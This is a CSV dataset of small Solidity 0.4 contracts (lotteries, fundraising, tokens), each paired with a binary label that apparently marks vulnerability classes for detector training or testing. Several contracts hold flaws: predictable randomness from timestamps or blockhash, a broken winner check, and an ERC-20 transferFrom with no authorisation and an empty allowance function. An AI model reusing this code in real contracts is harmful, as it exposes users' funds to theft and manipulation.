_id,name,code,label
10001,01_say_hello,"pragma solidity ^0.4.22;



contract Greeter {

    string greeting;

    address owner;



    modifier onlyOwner {

        require(isOwner(), ""Only owner can do that!"");

        _;

    }

    

    constructor(string _greeting) public {

        greeting = _greeting;

        owner = msg.sender;

    }



    function sayHello() public view returns(string) {

        if (isOwner()) {

            return ""Hey daddy!"";

        } else {

            return greeting;

        }

    }



    function setGreeting(string _newGreeting) public onlyOwner {

        greeting = _newGreeting;

    }

    

    function isOwner() view private returns(bool) {

        return msg.sender == owner;    

    }

}

",0000000000000000000000100
10002,02_balance_address_checker,"pragma solidity ^0.4.22;



contract Checker {

    address owner;

    

    constructor() public {

        owner = msg.sender;    

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    function getBalanceOfContract() public view returns(uint) {

        return address(this).balance;

    }

    

    function getBalanceOfOwner() public view onlyOwner returns(uint){

        return owner.balance;

    }

    

    function getBalanceOfSender() public view returns(uint) {

        return msg.sender.balance;

    }

    

    function getAddressOfContract() public view returns(address) {

        return this;

    }

   

    function getAddressOfOwner() public view returns(address) {

        return owner;    

    }

     

    function getAddressOfSender() public view returns(address) {

        return msg.sender;

    }

}",0000000000000000000000000
10003,03_basic_random,"pragma solidity ^0.4.23;



contract BasicRandom {

    uint randNonce = 0;



    function getRandomNumber() public returns(uint) {

        uint rand = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce)));

        randNonce++;        

        return rand;

    }

}",0000000000000000000000000
10004,04_lottery_10_users,"pragma solidity ^0.4.23;



contract Lottery10Users {

    address[10] participants;

    uint8 participantsCount = 0;

    uint randNonce = 0;



    function join() public payable {

        require(msg.value == 0.1 ether, ""Must send 0.1 ether"");

        require(participantsCount < 10, ""User limit reached"");

        require(joinedAlready(msg.sender) == false, ""User already joined"");

        participants[participantsCount] = msg.sender;

        participantsCount++;

        if (participantsCount == 10) {

            selectWinner();

        }

    }

    

    function joinedAlready(address _participant) private view returns(bool) {

        bool containsParticipant = false;

        for(uint i = 0; i < 10; i++) {

            if (participants[i] == _participant) {

                containsParticipant = true;

            }

        }

        return containsParticipant;

    }

    

    function selectWinner() private returns(address) {

        require(participantsCount == 10, ""Waiting for more users"");

        address winner = participants[randomNumber()];

        winner.transfer(address(this).balance);

        delete participants;

        participantsCount = 0;

        return winner;

    }

    

    function randomNumber() private returns(uint) {

        uint rand = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % 10;

        randNonce++;

        return rand;

    }

        

}",0000000000000000000000000
10005,04_lottery_10_users_adamskrodzki,"pragma solidity ^0.4.24;





 

contract LotteryFor10{



    address[] users; 

    mapping(address => bool) participated;

    uint256 public constant WAIT_BLOCKS_LIMIT = 3 ;

    uint256 public registeredCount ;

    uint256 public _registeredLimit ;

    uint256 constant REGISTERING_PARTICIPANTS = 1;

    uint256 constant REGISTERING_FINISHED = 2;

    uint256 constant WAITING_FOR_RANDOMNESS = 3;

    uint256 constant SOLVING_LOTERRY = 4;

    uint256 constant LOTTERY_SOLVED = 5;

    uint256 public waitingStartBlockNumber;

    bool public lotterySolved;

    

    constructor(uint256 _limit) public{

        waitingStartBlockNumber = 0;

        registeredCount = 0; 
        _registeredLimit = _limit;

    }

    

    

    

    function () public payable{

        

        if(getStage(block.number)==REGISTERING_PARTICIPANTS){

            processAddingUser(msg.sender);

        }

        else{  
            if(getStage(block.number)==REGISTERING_FINISHED){

                require(msg.value == 0,""no additional stake allowed"");

                waitingStartBlockNumber = block.number;

                emit ClosingList(waitingStartBlockNumber);

            }

            else{

                if(getStage(block.number)==WAITING_FOR_RANDOMNESS){

                        require(msg.value == 0,""no additional stake allowed"");

                        

                        revert(""To little time passed, wait at least WAIT_BLOCKS_LIMIT "");

                }

                else{

                    if(getStage(block.number)==SOLVING_LOTERRY){

                        require(msg.value == 0,""no additional stake allowed"");

                        processSolvingLottery(block.number);

                    }

                    else{        

                        revert(""Lottery Closed "");

                    }

                }

            }

        }

    }

    

    

    function getStage(uint256 blockNum) private view returns(uint256) {

        if(registeredCount<_registeredLimit){

            return REGISTERING_PARTICIPANTS;

        }

        else{

            if(waitingStartBlockNumber==0  
                || blockNum-waitingStartBlockNumber>=256  
                ){

                return REGISTERING_FINISHED;

            }

            else

            {

                if(blockNum-waitingStartBlockNumber<WAIT_BLOCKS_LIMIT){

                    return WAITING_FOR_RANDOMNESS;

                }

                else{

                    if(lotterySolved == true){

                        return LOTTERY_SOLVED;

                    }

                    else{

                        return SOLVING_LOTERRY;

                    }

                }

            }

        }

    }

    

    function processAddingUser(address sender) private{

        require(msg.value==1 finney,""Must send 0.001 ether"");

        require(participated[sender]==false,""One address can pericipate only once"");

        require(registeredCount<_registeredLimit,""ups getStage() do not work"");

        participated[sender] = true;

        users.push(sender);

        registeredCount = registeredCount+1;

        emit UserRegistered(sender);

    }

    

    function processSolvingLottery(uint256 blockNum) private{

        uint256 luckyNumber = uint256(blockhash(waitingStartBlockNumber+WAIT_BLOCKS_LIMIT));

        luckyNumber = luckyNumber % _registeredLimit;

        users[luckyNumber].transfer(address(this).balance);

        emit UseRewarded(users[luckyNumber],blockNum);

        lotterySolved = true;

    }

    

    event ClosingList(uint256 blockNum);

    event UserRegistered(address adr);

    event UseRewarded(address adr,uint256 blockNum);

}

",0000000000000000001000000
10006,05_lottery_no_limit,"pragma solidity ^0.4.23;



contract LotteryNoLimit {

    address owner;

    address[] users;

    uint randNonce = 0;

    

    modifier isOwner() {

        require(msg.sender == owner, ""only owner can do that"");

        _;

    }

    

    constructor() public {

        owner = msg.sender;    

    }

    

    function join() payable public {

        require(msg.value == 0.1 ether, ""Send 0.1 Ether"");

        users.push(msg.sender);

    }

    

    function selectWinner() public isOwner {

        require(users.length > 0, ""No users in the lottery"");

        users[randomNumber(users.length)].transfer(address(this).balance);  

        delete users;

    }

    

    function randomNumber(uint _limit) private returns(uint) {

        uint rand = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % _limit;

        randNonce++;

        return rand;

    }

}",0000000000000000000000000
10007,06_lottery_multiple_winners,"pragma solidity ^0.4.23;



contract LotteryMultipleWinners {

    address owner;

    uint randNonce = 0;

    address[] winners;

    uint prize;



    enum LotteryState { Accepting, Finished }

    LotteryState state; 



    mapping (address => bool) gotReward;

    mapping (uint => address[]) choices;

    

    modifier isOwner {

        require(msg.sender == owner, ""Must be owner"");

        _;

    }

    

    constructor() public {

        owner = msg.sender;   

        state = LotteryState.Accepting; 

    }

    

    function join(uint8 _chosenNumber) payable public {

        require(_chosenNumber > 0 && _chosenNumber <= 100, ""Number must be in 1-100"");

        require(msg.value == 0.1 ether, ""Transfer 0.1 Eth to join"");

        require(state == LotteryState.Accepting, ""Lottery is closed"");

        choices[_chosenNumber].push(msg.sender);   

    }

    

    function selectWinners() public isOwner returns(uint) {

        state = LotteryState.Finished;

        uint chosen = randomNumber(100) + 1;

        winners = choices[chosen];

        prize = address(this).balance / winners.length;

    }



    function withdrawReward() public {

        require(isWinner(), ""You must be a winner"");

        require(gotReward[msg.sender] != true, ""You have got your reward"");

        gotReward[msg.sender] = true;

        msg.sender.transfer(prize);

    }

    

    function isWinner() public view returns(bool) {

        for(uint i = 0; i < winners.length; i++) {

            if (winners[i] == msg.sender) {

                return true;

            } else {

                return false;

            }

        }

    }



    function randomNumber(uint _limit) internal returns(uint) {

        uint rand = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % _limit;

        randNonce++;

        return rand;

    } 

    

}",0100000000000000000001000
10008,07_fundraising,"pragma solidity ^0.4.22;



contract FundRaising {

    address owner;

    uint public goal;

    uint public endTime;

    uint public total = 0;

    

    mapping(address=>uint) donations;

    

    constructor(uint _goal, uint _timeLimit) public {

        owner = msg.sender;

        goal = _goal;

        endTime = now + _timeLimit;

    }

    

    function add() payable public {

        require(now < endTime, ""Fundraising is closed."");

        require(total < goal, ""We reached a goal."");

        require(msg.value > 0, ""You need to send some ether"");

        donations[msg.sender] += msg.value; 

        total += msg.value;

    }

    

    function withdrawOwner() public {

        require(msg.sender == owner, ""You must be owner"");

        require(total >= goal, ""Fundraising not closed yet"");

        owner.transfer(address(this).balance);

    }

    

    function withdraw() public {

        require(now > endTime, ""Fundraising not closed"");

        require(total < goal, ""Can not withdraw when fundraising was successful"");

        uint amount = donations[msg.sender];

        total -= amount;

        donations[msg.sender] = 0;

        address(msg.sender).transfer(amount);

    }

}",0000000000000000000000000
10009,08_basic_token,"pragma solidity ^0.4.22;



contract BasicToken {

    uint public initialSupply;



    mapping(address=>uint) balances;

    

    constructor(uint _initialSupply) public {

        initialSupply = _initialSupply;

        balances[msg.sender] = _initialSupply;

    }

    

    function transfer(address _recipient, uint _amount) public {

        require(balances[msg.sender] >= _amount, ""Not enough funds"");

        require(_recipient != msg.sender, ""No need to send tokens to yourself"");

        require(balances[_recipient] + _amount > balances[_recipient]);  
        balances[msg.sender] -= _amount;

        balances[_recipient] += _amount;

    }



    function balanceOf(address _owner) public view returns (uint) {

        return balances[_owner];

    }

}",0000000000000000000000000
10010,09_erc_20_token,"pragma solidity ^0.4.22;



contract TokenErc20 {

    string public name;

    string public symbol;

    uint8 decimals;

    

    uint public totalSupply;



    event Transfer(address indexed _from, address indexed _to, uint value);

    event Approval(address indexed _owner, address indexed _spender, uint value);

    

    mapping(address=>uint) public balances;

    mapping(address => mapping(address => uint)) allowances;

    

    constructor(

        string _name, 

        string _symbol,

        uint8 _decimals,

        uint _initialSupply

        ) public {

        name = _name;

        symbol = _symbol;

        decimals = _decimals;

        balances[msg.sender] = _initialSupply;

    }

    

    function balanceOf(address _owner) public view returns(uint balance) {

        return balances[_owner];    

    }

    

    function transfer(address _to, uint _value) public returns(bool success) {

        transferFrom(msg.sender, _to, _value);

    }

    

    function transferFrom(address _from, address _to, uint _value) public {

        require(balances[_from] >= _value);

        require(allowance(_from, _to) >= _value);

        balances[_from] -= _value;

        balances[_to] += _value;

        emit Transfer(_from, _to, _value);

    }

    

    function approve(address _spender, uint _value) public {

        allowances[msg.sender][_spender] = _value;   

    }

    

    function allowance(address _owner, address _spender) public view returns(uint) {

        allowances[_owner][_spender];    

    }

}",0000000001000000000000000
